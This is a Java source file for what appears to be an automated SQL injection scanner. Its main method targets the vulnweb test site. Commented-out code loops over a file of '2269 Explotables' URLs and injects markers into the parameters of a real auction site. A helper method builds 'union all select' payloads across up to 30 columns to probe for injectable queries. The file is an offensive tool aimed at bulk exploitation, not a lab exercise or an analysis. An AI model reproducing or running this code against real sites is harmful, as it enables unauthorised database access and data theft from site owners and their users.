/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package sql;

import ControladorMySql.ControladorMySql;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Arrays;

/**
 *
 * @author x01k
 */
public class Sql {

    public static void main(String[] args) throws IOException, InterruptedException {
        
//        int contador = 0;
//        try {
//            BufferedReader a = new BufferedReader(new FileReader("2269 Explotables.txt"));  
//            
//            while (a.ready()) {
//                //System.out.println(contador);
//                try {
//                    String linha = a.readLine();
//                    main.RecebeUrl(linha);
//                    //getUnion(linha);
//                } catch (Exception e) {
//                    //System.out.println(e);
//                }                
//                contador++;
//            }
//            a.close();
//        } catch (Exception e) {
//            
//        }              
//        ArrayList<String> urlTeste = new ArrayList<>();
//
//        String url = "http://testphp.vulnweb.com/listproducts.php?cat=1&price=2&sale=3";
//        String parseCombo[] = url.split("&");
//        for (int i = 0; i < parseCombo.length; i++) {
//            if ( i > 0){
//                urlTeste.add(parseCombo[i]);
//            }
//            
//        }       
//        String teste = "";
//        System.out.println(urlTeste.get(0));
//        System.out.println(urlTeste.get(1));
//        String compacta = "";
//        for (int i = 0; i < parseCombo.length; i++) {
//            for (int aux = 0; aux < urlTeste.size();aux++){
//                if (aux ==0){
//                    compacta = "&"+urlTeste.get(aux);
//                }else{
//                    compacta = compacta + "&"+ urlTeste.get(aux);
//                }
//                
//            }
//            System.out.println(parseCombo[0] + "[t]" + compacta);
//        }

        ControladorMySql cms = new ControladorMySql();        
        ControladorMain main = new ControladorMain(true);
        
        String url = "http://testphp.vulnweb.com/listproducts.php?cat=1&ads=231";
        main.RecebeUrl(url);
        
       // main.RecebeUrl(url);
//        int n = 0;
//        while (n <= 1) { 
//            main.RecebeUrl(url+n);
//            //Thread.sleep(5000);
//            n++;
//        }


//        String url = "http://www.rarebreedauctions.com/other_items.php?start=0&owner_id=100004&limit=10&item_type=all";
//        char c = '&';
//        StringBuffer url2 = null;
//        for (int i = 0; i < url.length(); i++) {
//            url2 = new StringBuffer(url);
//            if (url.charAt(i) == c) {
//                int a = url.charAt(i);
//                url2.replace(i, i, "!-!");
//                unionallselect1UnionInteger(url2.toString());
//            }
//            if (i == url.length()-1){
//                url2.replace(i+1, i+1, "!-!");
//               // System.out.println(url2.toString());
//               //System.out.println(i);
//               unionallselect1UnionInteger(url2.toString());
//            }            
//        }
    }
    public static void unionallselect1UnionInteger(String url) {        
        String formataUrl = url;
        int colunas = 30;
        String unionallselect1 = "999999.9+union+all+select+0x393133353134353632312e39";
        String monta = null;
        for (int i = 0; i < colunas; i++) {
            formataUrl = url;
            if (formataUrl.contains("!-!")) {
                if (i == 0) {
                    monta = unionallselect1;
                } else {
                    monta = monta + ","+unionallselect1;
                }
                formataUrl = formataUrl.replaceAll("!-!", monta);
                System.out.println(formataUrl);
            }
        }
    }
}
